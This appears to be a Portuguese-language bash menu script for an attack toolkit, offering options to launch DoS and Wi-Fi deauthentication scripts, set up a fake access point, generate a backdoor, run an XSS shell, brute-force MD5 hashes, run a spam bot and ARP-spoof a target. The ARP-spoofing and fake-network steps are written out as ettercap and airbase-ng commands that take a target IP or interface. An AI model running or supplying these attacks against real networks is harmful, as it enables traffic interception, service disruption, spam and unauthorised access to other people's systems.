#!/bin/bash

clear

cat requisitos/banner.txt

sleep 0.70

menu="
{0} sair do script 				{7} Ataque Dos
{1} consultar cep				{8} Derrubar Wifi
{2} Rastrear ip					{9} criar rede wifi fake
{3} Ativar modo monitor				{10} Criar backdoor automaticamente
{4} Shell em XSS				{11} arp spoofing
{5} Descriptografar MD5				{12} Atualizar script
{6} Spam-Bot
"

echo "By: H7X"
echo "Github: https://github.com/H7XX"
echo "Youtube: https://www.youtube.com/channel/UCKHc3Id634qWSrZ_vbQKGTQ"
echo "$menu"

read -p "Escolha uma opção >> " opcao

case "$opcao" in
	0)
		echo "tchau (^_^)／"
		exit 1
	;;

	1)
		read -p "Cep que você deseja consultar: " cep
		curl https://viacep.com.br/ws/$cep/json/
	;;


	2)
		ipinfo=bash requisitos/ipinfo.sh
	;;

	3)
		read -p "Sua interface: " ifacemonitor
		airmon-ng start $ifacemonitor
	;;

	4)
		cd requisitos
		python3 shellxss.py
		cd ..
	;;

	5)
		echo "Essa descriptografia é feita com brute force"
		echo "Então não garanto que você ira conseguir descriptografar"
		echo "tenha uma Wordlist instalada"
		read -p "Hash: " hash
		read -p "caminho da wordlist: " word
		php requisitos/md5b.php -f $word -v $hash
	;;

	6)
		cd requisitos/
		python3 SpamBot.py
		cd ..
	;;

	7)
		DOS=bash requisitos/DosConfig.sh
	;;

	8)
		wifidos=bash requisitos/WifiDos.sh
	;;

	9)
		echo "Recomendo usar a interface wlan0mon"
		read -p "Sua Interface: " interface
		read -p "Canal onde sua rede vai ficar ospedada: " canal
		read -p "Nome da Rede: " Rede
		airbase-ng $interface -c $canal -e $Rede
	;;

	10)
		cd requisitos/creat-backdoor
		./back7.sh
	;;

	11)
mensagem="
esse ataque não funciona em sites com
proteção https"
		echo "$mensagem"
		read -p "Presione {Enter} para continuar"
		figlet arp_spoof
		read -p "Digite sua interface: " arpiface
		read -p "Digite o ip do alvo: " iparp
		clear
		cat requisitos/creat-backdoor/cat-ascii
		echo " "
		sleep 0.70
		echo "Iniciando ataque..."
		echo "precione {Ctrl c} para parar o ataque"
		ettercap -T -q -i $arpiface -P arp_spoof -M arp /$iparp//
	;;

	12)
		clear
		update=bash requisitos/atualizar.sh
	;;

	*)
		echo -e "\e[33m[!]Opção invalida"
	;;

esac
